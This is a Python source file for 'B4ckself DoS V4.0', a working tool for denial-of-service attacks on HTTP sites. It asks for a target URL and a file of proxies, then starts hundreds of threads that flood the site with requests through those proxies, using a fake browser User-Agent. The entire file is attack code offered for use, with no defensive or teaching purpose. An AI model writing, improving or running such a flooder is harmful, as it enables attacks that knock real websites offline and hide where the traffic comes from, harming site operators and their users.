import urllib.request, os, threading, time, random, sys





class Spammer(threading.Thread):
    
    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = { 'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)' }
        self.Lock = threading.Lock()
        self.proxy = proxy


    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        sys.stdout.write("Thread #%s Proxy@%s"%(self.num, self.proxy))
            
    def run(self):
        global Close, Request, Tot_req
        self.Lock.acquire()
        print ('Starting thread #{0}'.format(self.num))
        self.Lock.release()
        time.sleep(1)
        while True:
            try:
                self.request()
            except:
                sys.stdout.write("Thread #%s Connection Proxy Lost...exiting\n"%(self.num))
                sys.exit(0)
        sys.exit(0)


class MainLoop():
        


    def check_url(self, url):
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
        return url


    def home(self):
        global Close, Request, Tot_req
        if os.name in ("nt", "dos", "ce"): 
            os.system('title       ........:::::   B4ckself DoS V4.0   :::::........        Python 3.3.3')
            os.system('color a')
            color = ['a', 'b', 'c', 'd', 'e', 'f']
            os.system('color %s' % (color[random.randrange(0, 5, 1)]))            
        print ('\n                     ###################################\n')
        print ('                 01010o.....::B4ckself DoS V4.0::.....o01010\n')
        print ('              #################################################')
        print ('\n\t  A DoS Concept for HTTP site, Coded by B4ckdoor skype: b4ckdoor.porn\n')
        print ('\t                ProxyHandling by Sikh887             \n\n')
        while True:        
            url = input('> Enter Url to DoS: ')
            url = self.check_url(url)
            try:
                req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'})
                response = urllib.request.urlopen(req)
                break
            except:
                print ('> Could not open specified url.')
        try:
            lista = str(input('> Enter the list of proxy: '))
            in_file = open(lista,"r")
        except:
            print ('Error to read file.')
        try:
            num_threads = int(input('> Enter the number of thread [800]: '))
        except:
            num_threads = 800


        for i in range(num_threads):
            in_line = in_file.readline()
            Spammer(url, i + 1, in_line).start()
            in_line = in_line[:-1]
        
if __name__ == '__main__':
    MainLoop().home()